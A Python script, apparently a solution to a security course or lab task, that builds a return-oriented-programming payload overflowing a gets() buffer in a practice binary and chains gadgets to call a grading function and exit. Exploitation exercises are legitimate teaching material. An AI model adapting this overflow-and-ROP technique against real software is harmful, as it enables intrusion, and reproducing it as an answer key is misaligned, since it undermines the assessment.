#!/usr/bin/env python3
"""Task 3 (ROP): build the payload for attack/dark-calc-nx.

"""

import sys

POP_RDI = 0x401A33  # 5f c3          pop rdi ; ret
RET = 0x401A34  # c3             ret
GRADE_EVAL = 0x401978  # grade_eval(edi == 4) prints the target string
EXIT_PLT = 0x4016E0  # exit@plt

BUF_SIZE = 16  # char buf[16] at rbp-0x10
SAVED_RBP = 8  # [rbp]
RET_OFFSET = BUF_SIZE + SAVED_RBP  # saved return address at [rbp+8]


def qword(value):
    """One 8-byte little-endian stack slot."""
    return value.to_bytes(8, "little")


payload = b"".join(
    (
        b"A" * RET_OFFSET,          # 16 bytes buffer fill + 8 bytes saved rbp
        qword(POP_RDI), qword(4),   # pop rdi ; ret -> rdi = 4  (grade)
        qword(RET),                 # align rsp for grade_eval
        qword(GRADE_EVAL),          # grade_eval(4): printf + fflush(stdout)
        qword(POP_RDI), qword(0),   # pop rdi ; ret -> rdi = 0  (exit status)
        qword(RET),                 # align rsp for exit
        qword(EXIT_PLT),            # exit(0): clean, never returns
    )
)

# gets() stops at the first newline, so no 0x0a byte may appear anywhere.
assert b"\n" not in payload, "payload must not contain a 0x0a byte"

sys.stdout.buffer.write(payload)
